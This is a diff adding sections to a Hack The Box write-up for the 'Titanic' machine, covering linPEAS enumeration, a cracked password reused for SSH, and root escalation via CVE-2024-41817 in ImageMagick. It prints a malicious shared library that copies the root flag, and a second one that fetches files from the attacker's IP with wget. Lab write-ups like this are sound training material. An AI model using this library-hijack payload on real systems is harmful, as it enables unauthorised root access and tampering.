@@ -5,6 +5,8 @@ created-at: 2025-02-20
 categories: ["Hack The Box", "WriteUp", "Cybersecurity"]
 ---
 
+![Machine Info Card](/docs/assets/2025-02/htb-titanic-0.png)
+
 ## Enumeration and Analysis
 
 > nmap 10.10.11.55
@@ -369,7 +371,7 @@ Dictionary cache hit:
 sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
 ```
 
-Checking for password reuse:
+Checking `25282528` for password reuse:
 
 ```
 > ssh developer@titanic.htb     
@@ -388,4 +390,102 @@ Bingo!
 
 ## Inside the machine
 
-// TODO: A little trolling
+Here you can find the user flag sitting on his home directory on the `user.txt` file.
+
+I remembered that earlier on the repository there was a docker-compose file for a MySql server that wasn't exposed on the machine. I tried to connect to it thinking it might be something interesting, but wasn't able to. Also couldn't find any record of a MySql instance running on the machine, so I let it go.
+
+After running some common analysis commands on the machine, I couldn't find anything, and decided to weaponize my investigation using [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS.
+
+### Setting up and running leanPEAS
+
+Executing from my machine:
+
+```
+> wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+> scp linpeas.sh developer@titanic.htb:/home/developer/linpeas.sh
+```
+
+then on the target machine:
+
+```
+> chmod +x linpeas.sh
+> ./linpeas.sh -a > report.txt
+```
+
+and after that is finished, extract the report back:
+
+```
+> scp developer@titanic.htb:/home/developer/report.txt ~/report.txt
+```
+
+and finally at the target machine (to avoid getting in the way of other players):
+
+```
+> rm linpeas.sh report.txt
+```
+
+> Would be nice to have some utility that pipes binary data over ssh, executes the code, and then pipes it back.
+
+## Privilege escalation
+
+leanPEAS reported some known vulnerabilities, but the machine ended up no being vulnerable to them.
+
+At this point, I couldn't find any clear attack vector, and I resorted to looking up other write-ups. I found [this](https://medium.com/@ievgenii.miagkov/htb-titanic-adde48f75ff2) one by [@ievgenii.miagkov](https://medium.com/@ievgenii.miagkov) that outlines the use of `CVE-2024–41817` to achieve privilege escalation.
+
+In hindsight, I probably would be able to locate this vulnerability myself if I had paid closed attention to the "Interesting GROUP writable files (not in Home)" section of the leanPEAS report:
+
+
+```
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
+  Group developer:
+/opt/app/static/assets/images
+/opt/app/tickets
+```
+
+What is weird to me is that there is no reason for the server to be running [ImageMagick](https://imagemagick.org/index.php) on a static image folder, specially when there isn't any image upload feature available on the application.
+
+IMO, this challenge could have been much better if there was a identity check or profile picture selection for your ticket.
+
+---
+
+The exploit here is taking advantage of a shared library functionality of ImageMagick. It allows you add custom code that is called whenever the app is called.
+
+So we go into the execution path where ImageMagick is called (as hinted by the sh script under `/opt/scripts/identify_images.sh`),
+create and compile a shared lib file: 
+
+```
+> cd /opt/app/static/assets/images/
+> gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("cp /root/root.txt root.txt; chmod 754 root.txt");
+    exit(0);
+}
+EOF
+```
+
+and after a couple of minutes (or instantly in my case?), the root flag will just show up on the directory.
+
+## A little trolling
+
+```
+> gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("wget http://<tun0 ip>:9000/entertainment.jpg -O entertainment.jpg");
+    system("wget http://<tun0 ip>:9000/exquisite-dining.jpg -O exquisite-dining.jpg");
+    system("wget http://<tun0 ip>:9000/home.jpg -O home.jpg");
+    system("wget http://<tun0 ip>:9000/luxury-cabins.jpg -O luxury-cabins.jpg");
+    exit(0);
+}
+EOF
+```
+
+![a little trolling](/docs/assets/2025-02/htb-titanic-6.png)
